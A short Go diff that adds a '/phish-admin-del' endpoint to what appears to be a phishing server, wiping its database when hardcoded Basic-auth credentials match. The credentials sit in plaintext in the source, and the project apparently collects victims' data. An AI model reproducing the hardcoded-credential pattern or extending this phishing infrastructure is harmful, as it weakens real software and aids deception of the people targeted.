@@ -151,6 +151,17 @@ func adminHandler(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
+func adminHandlerDel(w http.ResponseWriter, r *http.Request) {
+	username, password, ok := r.BasicAuth()
+	if username == "as535364" && password == "881015" && ok {
+		db.DelAll()
+	} else {
+		w.Header().Add("WWW-Authenticate", "Basic")
+		w.WriteHeader(401)
+		w.Write([]byte("想刪？"))
+	}
+}
+
 func main() {
 	//Parse
 	flag.StringVar(&phishURL, "phishURL", "http://localhost:8080", "部屬的網域：")
@@ -161,6 +172,7 @@ func main() {
 	// http server
 	http.HandleFunc("/", handler)
 	http.HandleFunc("/phish-admin", adminHandler)
+	http.HandleFunc("/phish-admin-del", adminHandlerDel)
 	err := http.ListenAndServe(port, nil)
 	if err != nil {
 		panic(err)
